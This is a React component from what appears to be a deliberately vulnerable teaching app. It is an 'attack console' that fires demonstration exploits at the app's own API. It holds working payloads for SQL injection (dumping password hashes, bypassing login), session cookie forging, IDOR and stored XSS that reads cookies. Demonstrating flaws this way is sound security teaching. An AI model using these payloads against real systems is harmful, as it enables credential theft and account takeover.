import { useState } from "react";

// A button per vulnerability. Each one fires the exploit request and shows the
// raw response, so the flaw can be demonstrated live. The same requests are in
// docs/exploits/ as curl / .http files.

interface Result {
  status: number;
  body: string;
}

async function raw(method: string, path: string, body?: unknown): Promise<Result> {
  const res = await fetch(path, {
    method,
    headers: body === undefined ? {} : { "Content-Type": "application/json" },
    credentials: "include",
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  const text = await res.text();
  return { status: res.status, body: prettify(text) };
}

function prettify(text: string): string {
  try {
    return JSON.stringify(JSON.parse(text), null, 2);
  } catch {
    return text;
  }
}

interface Attack {
  id: string;
  title: string;
  description: string;
  defaultPayload: string;
  run: (payload: string) => Promise<Result>;
}

const ATTACKS: Attack[] = [
  {
    id: "sqli-union",
    title: "SQL injection — dump the users table",
    description:
      "The search term is concatenated into the query. A UNION payload pulls every user's id, username and password hash out of the users table and returns them as fake notes (title = username, body = \"id | hash\").",
    defaultPayload:
      "' UNION SELECT NULL, username, id::text || ' | ' || password_hash, now(), now() FROM users --",
    run: (p) => raw("GET", `/api/notes/search?q=${encodeURIComponent(p)}`),
  },
  {
    id: "sqli-login",
    title: "SQL injection — log in without a password",
    description:
      "A username of  ' OR '1'='1' --  comments out the password check and matches the first row in the users table.",
    defaultPayload: "' OR '1'='1' --",
    run: (p) => raw("POST", "/api/auth/login", { username: p, password: "anything" }),
  },
  {
    id: "session-forge",
    title: "Broken auth — forge the session cookie",
    description:
      "The session cookie is just  uid=<id>  with no signature, and it is not HttpOnly. Copy a real user id from the SQL injection dump above, paste it here, and the button sets the cookie and calls /api/auth/me as that user.",
    defaultPayload: "00000000-0000-0000-0000-000000000000",
    run: async (p) => {
      document.cookie = `uid=${p}; Path=/; SameSite=None; Secure`;
      return raw("GET", "/api/auth/me");
    },
  },
  {
    id: "idor",
    title: "IDOR — read another user's note",
    description:
      "Note ids are sequential and the API never checks ownership. Enter a note id you do not own.",
    defaultPayload: "1",
    run: (p) => raw("GET", `/api/notes/${encodeURIComponent(p)}`),
  },
  {
    id: "stored-xss",
    title: "Stored XSS — save an executing payload",
    description:
      "Creates a note whose body is HTML. Open it from the Notes page (or reload) and the script runs, with access to the non-HttpOnly session cookie.",
    defaultPayload:
      '<img src=x onerror="alert(\'xss: \'+document.cookie)">',
    run: (p) => raw("POST", "/api/notes", { title: "xss demo", body: p }),
  },
  {
    id: "verbose-error",
    title: "Verbose errors — leak a stack trace",
    description:
      "An unbalanced quote breaks the SQL string. The 500 response contains the error message, the stack trace, and the exact query that ran.",
    defaultPayload: "'",
    run: (p) => raw("GET", `/api/notes/search?q=${encodeURIComponent(p)}`),
  },
];

function Card({ attack }: { attack: Attack }) {
  const [payload, setPayload] = useState(attack.defaultPayload);
  const [result, setResult] = useState<Result | null>(null);
  const [busy, setBusy] = useState(false);

  return (
    <section
      style={{ border: "1px solid #e5e7eb", borderRadius: 8, padding: 16, marginBottom: 16 }}
    >
      <h3 style={{ marginTop: 0 }}>{attack.title}</h3>
      <p style={{ color: "#4b5563", fontSize: 14 }}>{attack.description}</p>
      <textarea
        value={payload}
        onChange={(e) => setPayload(e.target.value)}
        rows={2}
        style={{ width: "100%", fontFamily: "monospace", padding: 6, boxSizing: "border-box" }}
      />
      <button
        type="button"
        disabled={busy}
        onClick={async () => {
          setBusy(true);
          try {
            setResult(await attack.run(payload));
          } finally {
            setBusy(false);
          }
        }}
        style={{ marginTop: 8 }}
      >
        {busy ? "…" : "Run"}
      </button>
      {result ? (
        <pre
          style={{
            marginTop: 12,
            background: "#0b1021",
            color: "#e2e8f0",
            padding: 12,
            borderRadius: 6,
            overflowX: "auto",
            fontSize: 12,
          }}
        >
          {`HTTP ${result.status}\n\n${result.body}`}
        </pre>
      ) : null}
    </section>
  );
}

export function AttackConsole() {
  return (
    <div>
      <h1>Attack console</h1>
      <p style={{ color: "#4b5563" }}>
        Each button sends a real request to this app's API and shows the response. This exists to
        demonstrate the flaws documented in the writeups.
      </p>
      <p style={{ fontSize: 14 }}>
        CSRF is shown separately with an off-site page:{" "}
        <a href="https://github.com/dagike/cybersecurity/blob/master/docs/exploits/csrf-poc.html">
          docs/exploits/csrf-poc.html
        </a>
        .
      </p>
      {ATTACKS.map((a) => (
        <Card key={a.id} attack={a} />
      ))}
    </div>
  );
}
